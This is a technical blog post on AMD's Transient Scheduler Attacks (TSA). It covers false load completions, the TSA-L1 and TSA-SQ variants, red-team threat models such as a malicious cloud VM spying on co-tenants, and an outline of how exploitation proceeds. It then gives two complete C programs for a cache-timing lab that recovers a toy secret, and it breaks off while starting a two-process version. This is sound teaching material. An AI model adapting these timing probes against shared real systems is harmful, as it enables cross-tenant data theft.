<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
